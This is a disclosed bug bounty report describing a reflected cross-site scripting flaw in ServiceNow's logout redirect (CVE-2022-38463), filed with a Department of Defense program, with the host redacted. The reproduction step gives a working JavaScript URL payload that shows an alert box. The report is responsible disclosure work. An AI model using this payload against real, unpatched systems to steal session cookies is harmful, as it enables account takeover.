# Reflected XSS at https://██████/

## Report Details
- **Report ID**: 1681178
- **URL**: https://hackerone.com/reports/1681178
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-08-26T10:08:17.213Z
- **Disclosed**: 2023-09-29T17:26:53.222Z

## Reporter
- **Username**: testingforbugs
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Description:**
There exists a reflected XSS within the logout functionality of ServiceNow. This enables an unauthenticated remote attacker to execute arbitrary JavaScript.

## References
* https://support.servicenow.com/kb?id=kb_article_view&sysparm_article=KB1156793

## Impact

Steal cookies to account takeover.

## System Host(s)
█████

## Affected Product(s) and Version(s)


## CVE Numbers
CVE-2022-38463

## Steps to Reproduce
1.Go to https://████/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain)
2.You will see alert box like this.
███████

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
